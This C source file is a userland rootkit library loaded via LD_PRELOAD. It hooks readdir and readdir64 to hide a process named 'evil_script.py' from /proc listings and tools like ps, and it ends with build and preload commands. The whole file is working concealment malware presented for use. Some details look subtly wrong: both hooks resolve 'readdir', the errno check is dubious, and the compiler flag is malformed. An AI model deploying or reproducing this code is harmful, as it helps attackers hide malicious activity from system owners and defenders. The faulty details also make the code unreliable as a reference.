#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "evil_script.py";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(long pid, char* buf, size_t size)
{
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%ld/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, "readdir");               \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    /*                                                                  \
     * Iterate the directory but if we find a /proc/PID                 \
     * directory corresponding to a process to filter, then             \
     * just avoid reporting it to the caller                            \
     */                                                                 \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir)                                                         \
        {                                                               \
            char buf[256];                                              \
            if(get_dir_name(dirp, buf, sizeof(buf)) &&                  \
                strcmp(buf, "/proc") == 0) {                            \
                                                                        \
                /*                                                      \
                 * The caller is iterating through /proc,               \
                 * filter every subdirectory with the right PID         \
                 */                                                     \
                long pid = strtol(dir->d_name, NULL, 10);               \
                /* printf("file1 '%s' '%s'\n", buf, dir->d_name); */    \
                if(errno != 0 &&                                        \
                    get_process_name(pid, buf, sizeof(buf)) &&          \
                    strcmp(buf, process_to_filter) == 0)                \
                {                                                       \
                    continue;                                           \
                }                                                       \
            }                                                           \
            else                                                        \
            {                                                           \
                /* printf("file2 '%s' '%s'\n", buf, dir->d_name); */    \
            }                                                           \
        }                                                               \
                                                                        \
        break;                                                          \
    }                                                                   \
                                                                        \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);

//
// gcc -Wall -shared -fPIC -dl -o libprocesshider.so processhider.c
// LD_PRELOAD=./libprocesshider.so ps
//
